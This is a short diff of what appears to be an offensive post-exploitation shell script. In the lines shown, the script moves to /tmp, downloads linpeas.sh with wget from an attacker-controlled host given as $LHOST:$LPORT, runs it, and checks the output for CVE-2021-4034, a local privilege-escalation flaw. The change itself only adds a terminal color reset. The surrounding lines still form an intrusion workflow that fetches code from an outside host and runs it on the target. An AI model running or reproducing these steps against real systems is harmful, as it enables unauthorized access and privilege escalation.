@@ -386,7 +386,7 @@ else
 	cd /tmp
 	wget http://$LHOST:$LPORT/linpeas.sh
 	echo -e '\E[31;40m' "Running linpeas and saving to lin.txt this may take a few minutes";tput sgr0
-	echo -e '\E[31;40m' "Running linpeas with user $i on $now"
+	echo -e '\E[31;40m' "Running linpeas with user $i on $now"; tput sgr0
 	bash linpeas.sh > lin.txt
 fi
 if grep CVE-2021-4034 lin.txt
